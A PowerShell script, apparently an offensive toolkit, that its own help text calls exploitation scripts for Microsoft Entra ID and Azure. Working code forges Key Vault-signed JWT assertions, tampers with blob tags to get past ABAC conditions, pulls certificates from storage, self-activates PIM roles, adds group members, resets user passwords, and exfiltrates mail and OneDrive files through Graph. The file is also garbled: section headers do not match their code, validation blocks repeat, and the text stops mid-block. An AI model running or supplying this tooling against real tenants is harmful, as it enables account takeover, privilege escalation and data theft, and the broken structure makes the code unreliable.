[CmdletBinding()]
param(
    [Parameter()]
    [ValidateSet("kvjwt", "blobtag", "blobget", "pimactivate", "groupadd", "logicapp", "changepass", "updateuser", "joboutput", "runbookcontent", "graphread")]
    [string]$Type,

    [Parameter()] [string]$KeyVaultToken,
    [Parameter()] [string]$VaultName,
    [Parameter()] [string]$AppId,
    [Parameter()] [string]$TenantId,
    [Parameter()] [int]$LifetimeMinutes = 5,

    # Storage params
    [Parameter()] [string]$StorageToken,
    [Parameter()] [string]$StorageName,
    [Parameter()] [string]$ContainerName,
    [Parameter()] [string]$BlobName,
    [Parameter()] [string]$TagKey,
    [Parameter()] [string]$TagValue,
    [Parameter()] [string]$OutPath,

    # LogicApp params
    [Parameter()] [string]$LogicAppName,
    [Parameter()] [string]$ResourceGroupName,
    [Parameter()] [string]$TriggerName = "manual",
    [Parameter()] [switch]$ExecuteCases,

    # GroupAdd params
    [Parameter()] [string]$GroupId,
    [Parameter()] [string]$MemberId,

    # PIM params
    [Parameter()] [string]$Identity,
    [Parameter()] [string]$RoleName,
    [Parameter()] [string]$Duration = "PT5M",
    [Parameter()] [string]$Justification = "Operational requirement",
    [Parameter()] [string]$ScopeName,

    # GraphRead params
    [Parameter()] [string]$GraphToken,
    [Parameter()] [string]$Mode,
    [Parameter()] [string]$MessageId,
    [Parameter()] [string]$FileName,

    # Automation params
    [Parameter()] [string]$ArmToken,
    [Parameter()] [string]$SubscriptionId,
    [Parameter()] [string]$AutomationAccountName,
    [Parameter()] [string]$JobId,
    [Parameter()] [string]$RunbookName,
    [Parameter()] [string]$OutputFolder = ".\",

    # ChangePass / UpdateUser params
    [Parameter()] [string]$Password,
    [Parameter()] [string]$Property,
    [Parameter()] [string]$Value,

    [Parameter()] [switch]$Help
)

# =============================================================
# HELP
# =============================================================

function Show-Help {
    Write-Host @"

ex_entraId.ps1 -- Exploitation scripts for Microsoft Entra ID / Azure

USAGE:
  .\ex_entraId.ps1 -Type <type> [options]

EXAMPLES:
  .\ex_entraId.ps1 -Type kvjwt          -KeyVaultToken `$KeyVault -VaultName "vault_name" -AppId "app_id" -TenantId "tenant_id"
  .\ex_entraId.ps1 -Type blobtag        -StorageToken `$AzureStorage -StorageName "storage_name" -ContainerName "container_name" -BlobName "blob_name" -TagKey "tag_key" -TagValue "tag_value"
  .\ex_entraId.ps1 -Type blobget        -StorageToken `$AzureStorage -StorageName "storage_name" -ContainerName "container_name" -BlobName "blob_name" -OutPath "C:\output\file.pfx"
  .\ex_entraId.ps1 -Type pimactivate    -Identity "user@tenant.com" -RoleName "role_name"
  .\ex_entraId.ps1 -Type pimactivate    -Identity "user@tenant.com" -RoleName "role_name" -Duration "PT30M" -Justification "Operational requirement" -ScopeName "scope_name"
  .\ex_entraId.ps1 -Type groupadd       -GroupId "group_object_id" -MemberId "directory_object_id"
  .\ex_entraId.ps1 -Type changepass     -Identity "user@tenant.com" -Password "NewPass123!"
  .\ex_entraId.ps1 -Type updateuser     -Identity "user@tenant.com" -Property "Department" -Value "value"
  .\ex_entraId.ps1 -Type graphread      -Mode onedrive -GraphToken `$Graph -Identity "user@tenant.com"
  .\ex_entraId.ps1 -Type graphread      -Mode mail     -GraphToken `$Graph -Identity "user@tenant.com"
  .\ex_entraId.ps1 -Type logicapp       -LogicAppName "app_name" -ResourceGroupName "resource_group_name"
  .\ex_entraId.ps1 -Type logicapp       -LogicAppName "app_name" -ResourceGroupName "resource_group_name" -TriggerName "manual" -ExecuteCases
  .\ex_entraId.ps1 -Type joboutput      -ArmToken `$ARM -SubscriptionId "subscription_id" -ResourceGroupName "resource_group_name" -AutomationAccountName "automation_account_name" -JobId "job_id"
  .\ex_entraId.ps1 -Type runbookcontent -SubscriptionId "subscription_id" -ResourceGroupName "resource_group_name" -AutomationAccountName "automation_account_name" -RunbookName "runbook_name" -OutputFolder "C:\output\"

TYPES:
  kvjwt          Generates a signed JWT assertion using a private key stored in Azure Key Vault.
                 Requires keys/sign/action on the target vault.
                 Stores the JWT in `$signedJWT and the selected certificate in `$AKVCertificate.

  blobtag        Modifies the index tags of a blob to satisfy ABAC conditions.
                 Useful when a role has tag-based access control conditions.
                 TagKey and TagValue are free — adaptable to any ABAC condition in the tenant.

  blobget        Downloads a blob, decodes Base64 content and reconstructs the file on disk.
                 Useful to extract PFX certificates or other binaries stored as Base64 in blobs.
                 If the blob is not Base64, the file is written as-is (plain text).

  pimactivate    Activates a PIM eligible role (selfActivate) for an identity.
                 Resolves the identity, filters by RoleName and optionally ScopeName,
                 and sends the POST to roleAssignmentScheduleRequests.

  groupadd       Adds a member to a group by ObjectId.
                 Requires write permissions on the target group.

  changepass     Resets the password of a cloud-only user via Update-MgUser.
                 Fails on users with OnPremisesSyncEnabled: True.

  updateuser     Updates a user attribute (Department, JobTitle, DisplayName, etc.) via Update-MgUser.
                 Requires User.ReadWrite.All or equivalent permissions.

  graphread      Exfiltrates data via Microsoft Graph.
                 -Mode onedrive: lists or downloads files from the user's OneDrive (driveItems).
                 -Mode mail: lists top 20 emails or reads a specific message (messages).

  logicapp       Retrieves the real callback URL of a Logic App, invokes it, extracts the second
                 trigger URL, detects actions/cases (display, execute, default) and optionally
                 executes them. Outputs callback_response.txt and logicapp_callback_summary.txt.

  joboutput      Retrieves the output of an Automation Account job via REST against ARM.
                 Requires $ARM token and Reader or higher on the Automation Account.

  runbookcontent Downloads the source code of a runbook via Export-AzAutomationRunbook.
                 Useful to understand what the runbook does and whether it handles credentials
                 or connections to other services.

NOTES:
  - blobtag uses PUT on the ?comp=tags endpoint — it does not read, it replaces all blob tags.
  - blobget downloads the blob, decodes Base64 and writes the binary to -OutPath.
  - If the blob is not Base64, the file is written as-is (plain text).
  - LifetimeMinutes applies only to kvjwt (default: 5 min).
  - Duration applies only to pimactivate (default: PT5M, ISO8601 format).
  - changepass fails on users with OnPremisesSyncEnabled: True.
  - graphread requires -Mode onedrive or -Mode mail.

"@ -ForegroundColor Cyan
}

# =============================================================
# HELPERS
# =============================================================
function Write-Ok   { param([string]$Msg) Write-Host "[+] $Msg" -ForegroundColor Green }
function Write-Err  { param([string]$Msg) Write-Host "[-] $Msg" -ForegroundColor Red }
function Write-Warn { param([string]$Msg) Write-Host "[!] $Msg" -ForegroundColor Yellow }

function ConvertTo-Base64Url {
    param([byte[]]$Bytes)
    [Convert]::ToBase64String($Bytes).TrimEnd('=').Replace('+', '-').Replace('/', '_')
}

# =============================================================
# KVJWT
# =============================================================
function New-SignedJWTWithKeyVault {
    param(
        [string]$ClientId, [string]$TenantId, [string]$KeyVaultToken,
        [string]$Kid, [string]$X5t, [int]$LifetimeMinutes = 5
    )
    $now = [DateTimeOffset]::UtcNow.ToUnixTimeSeconds()
    $exp = [DateTimeOffset]::UtcNow.AddMinutes($LifetimeMinutes).ToUnixTimeSeconds()
    $jti = [guid]::NewGuid().ToString()
    $jwtHeader  = [ordered]@{ alg = "RS256"; typ = "JWT"; x5t = $X5t }
    $jwtPayload = [ordered]@{ aud = "https://login.microsoftonline.com/$TenantId/oauth2/v2.0/token"; iss = $ClientId; sub = $ClientId; jti = $jti; nbf = $now; exp = $exp }
    $b64Header   = ConvertTo-Base64Url ([Text.Encoding]::UTF8.GetBytes(($jwtHeader  | ConvertTo-Json -Compress)))
    $b64Payload  = ConvertTo-Base64Url ([Text.Encoding]::UTF8.GetBytes(($jwtPayload | ConvertTo-Json -Compress)))
    $unsignedJwt = "$b64Header.$b64Payload"
    $hash                = [System.Security.Cryptography.SHA256]::Create().ComputeHash([Text.Encoding]::ASCII.GetBytes($unsignedJwt))
    $jwtSha256HashB64Url = ConvertTo-Base64Url $hash
    $response = Invoke-RestMethod -Method POST -Uri "$Kid/sign?api-version=7.3" `
        -Headers @{ Authorization = "Bearer $KeyVaultToken"; "Content-Type" = "application/json" } `
        -Body ([ordered]@{ alg = "RS256"; value = $jwtSha256HashB64Url } | ConvertTo-Json -Compress) -ErrorAction Stop
    return "$unsignedJwt.$($response.value)"
}

if ($Type -eq "kvjwt") {
    $kvURI  = "https://$VaultName.vault.azure.net"
    $apiVer = "7.4"
    $hdrs   = @{ Authorization = "Bearer $KeyVaultToken" }
    $now    = [DateTimeOffset]::UtcNow.ToUnixTimeSeconds()

    try { $certs = (Invoke-RestMethod -Method GET -Uri "$kvURI/certificates?api-version=$apiVer" -Headers $hdrs -ErrorAction Stop).value }
    catch { Write-Err "Failed to enumerate certificates: $($_.Exception.Message -split "`n" | Select-Object -First 1)"; exit 1 }

    if (-not $certs -or $certs.Count -eq 0) { Write-Err "No certificates found in $VaultName."; exit 1 }

    $JWTAssertionCandidates = foreach ($cert in $certs) {
        try {
            $cd = Invoke-RestMethod -Method GET -Uri "$($cert.id)?api-version=$apiVer" -Headers $hdrs -ErrorAction Stop
            $x5t = $cd.x5t; $kid = $cd.kid; $sid = $cd.sid; $enabled = $cd.attributes.enabled
            $nbf = $cd.attributes.nbf; $exp = $cd.attributes.exp
            $nbfUTC = if ($nbf) { [DateTimeOffset]::FromUnixTimeSeconds($nbf).UtcDateTime } else { $null }
            $expUTC = if ($exp) { [DateTimeOffset]::FromUnixTimeSeconds($exp).UtcDateTime } else { $null }
            $isTimeValid = ($(if ($nbf) { $now -ge $nbf } else { $true })) -and ($(if ($exp) { $now -le $exp } else { $true }))
            $keyOps = @(); $keyType = $null; $canSign = $false
            if ($kid) {
                try { $ki = Invoke-RestMethod -Method GET -Uri "$kid`?api-version=$apiVer" -Headers $hdrs -ErrorAction Stop; $keyOps = @($ki.key.key_ops); $keyType = $ki.key.kty; $canSign = $keyOps -contains "sign" }
                catch { Write-Warn "Could not query key for $(($cd.id -split '/')[-1])" }
            }
            [PSCustomObject]@{ VaultName=$VaultName; CertificateName=($cd.id -split "/")[-1]; Enabled=$enabled; NotBeforeUTC=$nbfUTC; ExpiresUTC=$expUTC; IsTimeValid=$isTimeValid; x5t=$x5t; kid=$kid; sid=$sid; KeyType=$keyType; KeyOps=($keyOps -join ", "); CanSign=$canSign; UsableForJWTAssertion=($enabled -and $isTimeValid -and $canSign -and $x5t -and $kid) }
        } catch {
            [PSCustomObject]@{ VaultName=$VaultName; CertificateName=($cert.id -split "/")[-1]; Enabled=$null; NotBeforeUTC=$null; ExpiresUTC=$null; IsTimeValid=$false; x5t=$null; kid=$null; sid=$null; KeyType=$null; KeyOps=$null; CanSign=$false; UsableForJWTAssertion=$false; Error=$_.Exception.Message.Split("`n")[0] }
        }
    }

    Set-Variable -Name "JWTAssertionCandidates" -Value $JWTAssertionCandidates -Scope Global
    $AKVCertificate = $JWTAssertionCandidates | Where-Object { $_.UsableForJWTAssertion -eq $true } | Select-Object -First 1
    Set-Variable -Name "AKVCertificate" -Value $AKVCertificate -Scope Global
    if (-not $AKVCertificate) { Write-Err "No usable certificate found for JWT assertion."; exit 1 }

    try {
        $signedJWT = New-SignedJWTWithKeyVault -ClientId $AppId -TenantId $TenantId -KeyVaultToken $KeyVaultToken -Kid $AKVCertificate.kid -X5t $AKVCertificate.x5t -LifetimeMinutes $LifetimeMinutes
        Set-Variable -Name "signedJWT" -Value $signedJWT -Scope Global
        Write-Ok "JWT assertion generated and saved to `$signedJWT"
        Write-Host ""
        Write-Host "  AppId    : $AppId"    -ForegroundColor White
        Write-Host "  TenantId : $TenantId" -ForegroundColor White
        Write-Host "  Lifetime : $LifetimeMinutes min" -ForegroundColor White
        Write-Host "  Cert     : $($AKVCertificate.CertificateName)" -ForegroundColor White
        Write-Host ""
        Write-Host "  JWT (truncated):" -ForegroundColor DarkGray
        Write-Host "  $($signedJWT.Substring(0, [Math]::Min(80, $signedJWT.Length)))..." -ForegroundColor DarkGray
    } catch { Write-Err "Failed to sign JWT: $($_.Exception.Message -split "`n" | Select-Object -First 1)"; exit 1 }
}

# =============================================================
# BLOBTAG
# =============================================================
elseif ($Type -eq "blobtag") {
    $url  = "https://$StorageName.blob.core.windows.net/$ContainerName/${BlobName}?comp=tags"
    $body = @"
<?xml version="1.0" encoding="utf-8"?>
<Tags>
  <TagSet>
    <Tag>
      <Key>$TagKey</Key>
      <Value>$TagValue</Value>
    </Tag>
  </TagSet>
</Tags>
"@
    try {
        Invoke-RestMethod -Method PUT -Uri $url -UseBasicParsing `
            -Headers @{ "Content-Type"="application/xml; charset=UTF-8"; "Authorization"="Bearer $StorageToken"; "x-ms-version"="2020-04-08" } `
            -Body $body -ErrorAction Stop
        Write-Ok "Blob tags updated successfully."
        Write-Host ""; Write-Host "  StorageAccount : $StorageName" -ForegroundColor White
        Write-Host "  Container      : $ContainerName" -ForegroundColor White
        Write-Host "  Blob           : $BlobName"      -ForegroundColor White
        Write-Host "  Tag            : $TagKey = $TagValue" -ForegroundColor White
    } catch { Write-Err "Failed to update blob tags: $($_.Exception.Message -split "`n" | Select-Object -First 1)"; exit 1 }
}

# =============================================================
# BLOBGET
# =============================================================
elseif ($Type -eq "blobget") {
    $url     = "https://$StorageName.blob.core.windows.net/$ContainerName/$BlobName"
    $tmpFile = "$OutPath.tmp"
    try {
        Invoke-RestMethod -Method GET -Uri $url -OutFile $tmpFile -UseBasicParsing `
            -Headers @{ "Authorization"="Bearer $StorageToken"; "x-ms-version"="2017-11-09"; "accept-encoding"="gzip, deflate" } -ErrorAction Stop
        try {
            $content    = Get-Content $tmpFile -Raw
            $secretByte = [Convert]::FromBase64String($content.Trim())
            [System.IO.File]::WriteAllBytes($OutPath, $secretByte)
            Write-Ok "Blob downloaded and decoded from Base64 -> $OutPath"
        } catch { Copy-Item $tmpFile $OutPath -Force; Write-Ok "Blob downloaded as-is (not Base64) -> $OutPath" }
        Remove-Item $tmpFile -ErrorAction SilentlyContinue
        Write-Host ""; Write-Host "  StorageAccount : $StorageName"  -ForegroundColor White
        Write-Host "  Container      : $ContainerName" -ForegroundColor White
        Write-Host "  Blob           : $BlobName"      -ForegroundColor White
        Write-Host "  OutPath        : $OutPath"        -ForegroundColor White
        if ($OutPath -match "\.pfx$") {
            try {
                $pfx = Get-PfxCertificate -FilePath $OutPath -ErrorAction Stop
                Write-Host ""; Write-Ok "PFX validated successfully:"
                Write-Host "  Subject    : $($pfx.Subject)"    -ForegroundColor White
                Write-Host "  Thumbprint : $($pfx.Thumbprint)" -ForegroundColor White
                Write-Host "  Expires    : $($pfx.NotAfter)"   -ForegroundColor White
            } catch { Write-Warn "File written but PFX validation failed: $($_.Exception.Message -split "`n" | Select-Object -First 1)" }
        }
    } catch { Write-Err "Failed to download blob: $($_.Exception.Message -split "`n" | Select-Object -First 1)"; Remove-Item $tmpFile -ErrorAction SilentlyContinue; exit 1 }
}

# =============================================================
# LOGICAPP - Invoke Logic App and extract trigger URLs
# =============================================================
elseif ($Type -eq "logicapp") {

    Write-Host "`n[+] Logic App: $LogicAppName" -ForegroundColor Green
    Write-Host "[+] Resource Group: $ResourceGroupName" -ForegroundColor Green
    Write-Host "[+] Trigger: $TriggerName`n" -ForegroundColor Green

    try {
        $Callback = Get-AzLogicAppTriggerCallbackUrl -TriggerName $TriggerName -Name $LogicAppName -ResourceGroupName $ResourceGroupName -ErrorAction Stop
    } catch { Write-Err "Failed to get callback URL: $($_.Exception.Message -split "`n" | Select-Object -First 1)"; exit 1 }

    if (-not $Callback.Value) { Write-Err "No callback URL returned."; exit 1 }
    $PrimaryCallbackUrl = $Callback.Value
    Write-Host "[+] Callback URL:" -ForegroundColor Green
    Write-Host $PrimaryCallbackUrl
    Write-Host ""

    try {
        $Response = Invoke-RestMethod -Method POST -UseBasicParsing -Uri $PrimaryCallbackUrl -ErrorAction Stop
    } catch { Write-Err "Error invoking callback: $($_.Exception.Message -split "`n" | Select-Object -First 1)"; exit 1 }

    $ResponseText = $Response.ToString()
    Write-Ok "Response received."
    Write-Host ""

    # Extract second trigger URL
    $SecondTriggerUrl = ([regex]::Match($ResponseText, 'https://prod-[^\s"]+logic\.azure\.com[^\s""]+')).Value
    if (-not $SecondTriggerUrl) {
        Write-Warn "No second trigger URL found in response."
        Write-Host "[*] Saving full response to callback_response.txt"
        $ResponseText | Out-File ".\callback_response.txt"
        exit 0
    }

    Write-Host "[+] Second Trigger URL:" -ForegroundColor Green
    Write-Host $SecondTriggerUrl
    Write-Host ""

    # Key indicators
    Write-Host "[+] Indicators found in response:" -ForegroundColor Green
    $InterestingPatterns = @(
        '"method"\s*:\s*"GET"', '"relativePath"\s*:\s*"/{', '"Switch"',
        '"case"\s*:\s*"display"', '"case"\s*:\s*"execute"', '"default"',
        '"type"\s*:\s*"Response"', '"body"\s*:'
    )
    foreach ($Pattern in $InterestingPatterns) {
        if ($ResponseText -match $Pattern) { Write-Host "    [+] Match: $Pattern" -ForegroundColor Yellow }
    }
    Write-Host ""

    # Build URLs
    $DisplayUrl     = $SecondTriggerUrl -replace '\{action\}', 'display'
    $ExecuteUrl     = $SecondTriggerUrl -replace '\{action\}', 'execute'
    $DefaultTestUrl = $SecondTriggerUrl -replace '\{action\}', 'aaaa'

    Write-Host "[+] Display URL : $DisplayUrl"
    Write-Host "[+] Execute URL : $ExecuteUrl"
    Write-Host "[+] Default URL : $DefaultTestUrl"
    Write-Host ""

    # Save evidence
    $ResponseText | Out-File ".\callback_response.txt"
    [PSCustomObject]@{
        LogicAppName       = $LogicAppName
        ResourceGroupName  = $ResourceGroupName
        TriggerName        = $TriggerName
        PrimaryCallbackUrl = $PrimaryCallbackUrl
        SecondTriggerUrl   = $SecondTriggerUrl
        DisplayUrl         = $DisplayUrl
        ExecuteUrl         = $ExecuteUrl
        DefaultTestUrl     = $DefaultTestUrl
    } | Format-List | Out-File ".\logicapp_callback_summary.txt"

    Write-Ok "callback_response.txt saved."
    Write-Ok "logicapp_callback_summary.txt saved."
    Write-Host ""

    if ($ExecuteCases) {
        Write-Host "[+] Executing cases..." -ForegroundColor Cyan
        Write-Host "`n--- DISPLAY ---"
        try { Invoke-RestMethod -Method GET -UseBasicParsing -Uri $DisplayUrl } catch { Write-Err "display: $($_.Exception.Message -split "`n" | Select-Object -First 1)" }
        Write-Host "`n--- EXECUTE ---"
        try { Invoke-RestMethod -Method GET -UseBasicParsing -Uri $ExecuteUrl } catch { Write-Err "execute: $($_.Exception.Message -split "`n" | Select-Object -First 1)" }
        Write-Host "`n--- DEFAULT TEST ---"
        try { Invoke-RestMethod -Method GET -UseBasicParsing -Uri $DefaultTestUrl } catch { Write-Err "default: $($_.Exception.Message -split "`n" | Select-Object -First 1)" }
    }

    Write-Ok "Done."
}

# =============================================================
# GROUPADD - Add a member to a group
# =============================================================
elseif ($Type -eq "groupadd") {
    try {
        New-MgGroupMember -GroupId $GroupId -DirectoryObjectId $MemberId -ErrorAction Stop
        Write-Ok "Member added successfully."
        Write-Host ""
        Write-Host "  GroupId  : $GroupId"  -ForegroundColor White
        Write-Host "  MemberId : $MemberId" -ForegroundColor White
    } catch {
        Write-Err "Failed to add member: $($_.Exception.Message -split "`n" | Select-Object -First 1)"
        exit 1
    }
}

# =============================================================
# UPDATEUSER - Update a user attribute
# =============================================================
elseif ($Type -eq "updateuser") {
    $params = @{ $Property = $Value }
    try {
        Update-MgUser -UserId $Identity -BodyParameter $params -ErrorAction Stop
        Write-Ok "User attribute updated successfully."
        Write-Host ""
        Write-Host "  Identity : $Identity" -ForegroundColor White
        Write-Host "  Property : $Property" -ForegroundColor White
        Write-Host "  Value    : $Value"    -ForegroundColor White
    } catch {
        Write-Err "Failed to update user: $($_.Exception.Message -split "`n" | Select-Object -First 1)"
        exit 1
    }
}

# =============================================================
# GRAPHREAD - Read OneDrive or mailbox content through Microsoft Graph
# =============================================================
elseif ($Type -eq "graphread") {

    $hdrs = @{ Authorization = "Bearer $GraphToken"; "Content-Type" = "application/json" }

    if ($Mode -eq "onedrive") {
        Write-Host "`n[*] Enumerating OneDrive for: $Identity" -ForegroundColor Cyan
        try {
            $uri = "https://graph.microsoft.com/beta/users/$Identity/drive/root/children"
            $result = (Invoke-RestMethod -Method GET -Uri $uri -Headers $hdrs -UseBasicParsing -ErrorAction Stop).value
            if (-not $result -or $result.Count -eq 0) { Write-Warn "No files found."; exit 0 }

            $result | Select-Object name, size, createdDateTime, lastModifiedDateTime,
                @{n="type"; e={ if ($_.folder) { "folder" } elseif ($_.file) { "file" } else { "unknown" } }} |
                Sort-Object lastModifiedDateTime -Descending | Format-Table -AutoSize

            Set-Variable -Name "OneDriveItems" -Value $result -Scope Global

            # Download file if -FileName is provided
            if ($FileName) {
                $item = $result | Where-Object { $_.name -eq $FileName } | Select-Object -First 1
                if (-not $item) { Write-Err "File '$FileName' not found in OneDrive."; exit 1 }
                # downloadUrl is returned as a direct property on the REST object
                $downloadUrl = $item.PSObject.Properties['@microsoft.graph.downloadUrl'].Value
                if (-not $downloadUrl) {
                    Write-Err "No download URL found for '$FileName'. The file may require special permissions."
                    exit 1
                }
                $outPath = Join-Path $OutputFolder $FileName
                Invoke-WebRequest -Uri $downloadUrl -OutFile $outPath -UseBasicParsing -ErrorAction Stop
                Write-Ok "File downloaded -> $outPath"
            }
        } catch { Write-Err "Failed to enumerate OneDrive: $($_.Exception.Message -split "`n" | Select-Object -First 1)"; exit 1 }

    } elseif ($Mode -eq "mail") {
        if ($MessageId) {
            # Read a specific message body
            Write-Host "`n[*] Reading message: $MessageId" -ForegroundColor Cyan
            try {
                $msg = Get-MgUserMessage -UserId $Identity -MessageId $MessageId -Property Body -ErrorAction Stop
                Write-Ok "Message body retrieved."
                Write-Host ""
                Write-Host "--- BODY ---" -ForegroundColor Cyan
                Write-Host $msg.Body.Content
            } catch { Write-Err "Failed to read message: $($_.Exception.Message -split "`n" | Select-Object -First 1)"; exit 1 }
        } else {
            # List the top 20 messages
            Write-Host "`n[*] Listing messages for: $Identity" -ForegroundColor Cyan
            try {
                $msgs = Get-MgUserMessage -UserId $Identity -Top 20 -ErrorAction Stop
                if (-not $msgs -or $msgs.Count -eq 0) { Write-Warn "No messages found."; exit 0 }
                $msgs | Select-Object Subject, @{n="From"; e={ $_.From.EmailAddress.Address }}, ReceivedDateTime, Id |
                    Sort-Object ReceivedDateTime -Descending | Format-List
                Write-Ok "To read a specific message add: -MessageId <Id>"
            } catch { Write-Err "Failed to list messages: $($_.Exception.Message -split "`n" | Select-Object -First 1)"; exit 1 }
        }
    } else {
        Write-Err "Mode '$Mode' not recognized. Valid: onedrive, mail"
        exit 1
    }
}

# =============================================================
# JOBOUTPUT - Get Azure Automation job output
# =============================================================
elseif ($Type -eq "graphread") {
    if (-not $GraphToken) { throw "[-] -GraphToken es obligatorio para -Type 'graphread'." }
    if (-not $Identity)   { throw "[-] -Identity es obligatorio para -Type 'graphread'." }
    if (-not $Mode)       { throw "[-] -Mode es obligatorio para -Type 'graphread'. Valores: onedrive, mail" }
}
if ($Type -eq "joboutput") {
    $automationAccount = "/subscriptions/$SubscriptionId/resourceGroups/$ResourceGroupName/providers/Microsoft.Automation/automationAccounts/$AutomationAccountName"
    $uri = "https://management.azure.com$automationAccount/jobs/$JobId/output?api-version=2023-11-01"
    try {
        $result = Invoke-RestMethod -Method GET -Uri $uri -Headers @{ Authorization = "Bearer $ArmToken" } -ErrorAction Stop
        Write-Ok "Job output retrieved successfully."
        Write-Host ""
        Write-Host "  SubscriptionId       : $SubscriptionId"       -ForegroundColor White
        Write-Host "  ResourceGroup        : $ResourceGroupName"     -ForegroundColor White
        Write-Host "  AutomationAccount    : $AutomationAccountName" -ForegroundColor White
        Write-Host "  JobId                : $JobId"                 -ForegroundColor White
        Write-Host ""
        Write-Host "--- OUTPUT ---" -ForegroundColor Cyan
        Write-Host $result
    } catch {
        Write-Err "Failed to get job output: $($_.Exception.Message -split "`n" | Select-Object -First 1)"
        exit 1
    }
}

# =============================================================
# RUNBOOKCONTENT - Download runbook content
# =============================================================
elseif ($Type -eq "runbookcontent") {
    try {
        Export-AzAutomationRunbook -Name $RunbookName -AutomationAccountName $AutomationAccountName `
            -ResourceGroupName $ResourceGroupName -Slot Published -OutputFolder $OutputFolder -ErrorAction Stop
        Write-Ok "Runbook exported successfully."
        Write-Host ""
        Write-Host "  AutomationAccount : $AutomationAccountName" -ForegroundColor White
        Write-Host "  ResourceGroup     : $ResourceGroupName"     -ForegroundColor White
        Write-Host "  RunbookName       : $RunbookName"           -ForegroundColor White
        Write-Host "  OutputFolder      : $OutputFolder"          -ForegroundColor White
    } catch {
        Write-Err "Failed to export runbook: $($_.Exception.Message -split "`n" | Select-Object -First 1)"
        exit 1
    }
}

# =============================================================
# CHANGEPASS - Change a user's password
# =============================================================
elseif ($Type -eq "updateuser") {
    if (-not $Identity) { throw "[-] -Identity es obligatorio para -Type 'updateuser'." }
    if (-not $Property)  { throw "[-] -Property es obligatorio para -Type 'updateuser'." }
    if (-not $Value)     { throw "[-] -Value es obligatorio para -Type 'updateuser'." }
}
if ($Type -eq "graphread") {
    if (-not $GraphToken) { throw "[-] -GraphToken es obligatorio para -Type 'graphread'." }
    if (-not $Identity)   { throw "[-] -Identity es obligatorio para -Type 'graphread'." }
    if (-not $Mode)       { throw "[-] -Mode es obligatorio para -Type 'graphread'. Valores: onedrive, mail" }
}
if ($Type -eq "joboutput") {
    if (-not $ArmToken)             { throw "[-] -ArmToken es obligatorio para -Type 'joboutput'." }
    if (-not $SubscriptionId)       { throw "[-] -SubscriptionId es obligatorio para -Type 'joboutput'." }
    if (-not $ResourceGroupName)    { throw "[-] -ResourceGroupName es obligatorio para -Type 'joboutput'." }
    if (-not $AutomationAccountName){ throw "[-] -AutomationAccountName es obligatorio para -Type 'joboutput'." }
    if (-not $JobId)                { throw "[-] -JobId es obligatorio para -Type 'joboutput'." }
}
if ($Type -eq "runbookcontent") {
    if (-not $SubscriptionId)       { throw "[-] -SubscriptionId es obligatorio para -Type 'runbookcontent'." }
    if (-not $ResourceGroupName)    { throw "[-] -ResourceGroupName es obligatorio para -Type 'runbookcontent'." }
    if (-not $AutomationAccountName){ throw "[-] -AutomationAccountName es obligatorio para -Type 'runbookcontent'." }
    if (-not $RunbookName)          { throw "[-] -RunbookName es obligatorio para -Type 'runbookcontent'." }
}
if ($Type -eq "changepass") {
    $passwordProfile = @{
        forceChangePasswordNextSignIn = $false
        password = $Password
    }
    try {
        Update-MgUser -UserId $Identity -PasswordProfile $passwordProfile -ErrorAction Stop
        Write-Ok "Password updated successfully."
        Write-Host ""
        Write-Host "  Identity : $Identity" -ForegroundColor White
        Write-Host "  Password : $Password" -ForegroundColor White
    } catch {
        Write-Err "Failed to update password: $($_.Exception.Message -split "`n" | Select-Object -First 1)"
        exit 1
    }
}

# =============================================================
# PIMACTIVATE - Activate an eligible PIM role (selfActivate)
# =============================================================
elseif ($Type -eq "updateuser") {
    if (-not $Identity) { throw "[-] -Identity es obligatorio para -Type 'updateuser'." }
    if (-not $Property)  { throw "[-] -Property es obligatorio para -Type 'updateuser'." }
    if (-not $Value)     { throw "[-] -Value es obligatorio para -Type 'updateuser'." }
}
if ($Type -eq "graphread") {
    if (-not $GraphToken) { throw "[-] -GraphToken es obligatorio para -Type 'graphread'." }
    if (-not $Identity)   { throw "[-] -Identity es obligatorio para -Type 'graphread'." }
    if (-not $Mode)       { throw "[-] -Mode es obligatorio para -Type 'graphread'. Valores: onedrive, mail" }
}
if ($Type -eq "joboutput") {
    if (-not $ArmToken)             { throw "[-] -ArmToken es obligatorio para -Type 'joboutput'." }
    if (-not $SubscriptionId)       { throw "[-] -SubscriptionId es obligatorio para -Type 'joboutput'." }
    if (-not $ResourceGroupName)    { throw "[-] -ResourceGroupName es obligatorio para -Type 'joboutput'." }
    if (-not $AutomationAccountName){ throw "[-] -AutomationAccountName es obligatorio para -Type 'joboutput'." }
    if (-not $JobId)                { throw "[-] -JobId es obligatorio para -Type 'joboutput'." }
}
if ($Type -eq "runbookcontent") {
    if (-not $SubscriptionId)       { throw "[-] -SubscriptionId es obligatorio para -Type 'runbookcontent'." }
    if (-not $ResourceGroupName)    { throw "[-] -ResourceGroupName es obligatorio para -Type 'runbookcontent'." }
    if (-not $AutomationAccountName){ throw "[-] -AutomationAccountName es obligatorio para -Type 'runbookcontent'." }
    if (-not $RunbookName)          { throw "[-] -RunbookName es obligatorio para -Type 'runbookcontent'." }
}
if ($Type -eq "changepass") {
    if (-not $Identity) { throw "[-] -Identity es obligatorio para -Type 'changepass'." }
    if (-not $Password)  { throw "[-] -Password es obligatorio para -Type 'changepass'." }
}
if ($Type -eq "pimactivate") {

    # Resolve identity
    $principalId = $null
    $isGuid = [Guid]::Empty
    if ([Guid]::TryParse($Identity, [ref]$isGuid)) {
        $principalId = $Identity
    } else {
        try {
            $u = Get-MgUser -Filter "userPrincipalName eq '$Identity'" -ErrorAction Stop
            if (-not $u) { $u = Get-MgUser -Filter "displayName eq '$Identity'" -ErrorAction Stop | Select-Object -First 1 }
            if ($u) { $principalId = $u.Id }
        } catch {}
    }
    if (-not $principalId) { Write-Err "Identity not found: $Identity"; exit 1 }

    # Get eligible instances
    try {
        $instances = @(Get-MgRoleManagementDirectoryRoleEligibilityScheduleInstance `
            -Filter "principalId eq '$principalId'" `
            -ExpandProperty "roleDefinition,directoryScope" -All -ErrorAction Stop)
    } catch { Write-Err "Failed to enumerate eligible roles: $($_.Exception.Message -split "`n" | Select-Object -First 1)"; exit 1 }

    # Filter by RoleName
    $filtered = @($instances | Where-Object { $_.RoleDefinition.DisplayName -eq $RoleName })

    # Filter by ScopeName if provided
    if ($ScopeName -and $filtered.Count -gt 1) {
        $filtered = @($filtered | Where-Object {
            $_.DirectoryScope.AdditionalProperties.displayName -eq $ScopeName -or
            $_.DirectoryScopeId -eq $ScopeName
        })
    }

    if ($filtered.Count -eq 0) {
        Write-Err "No eligible assignment found for role '$RoleName'$(if ($ScopeName) { " scoped to '$ScopeName'" })."
        exit 1
    }
    if ($filtered.Count -gt 1) {
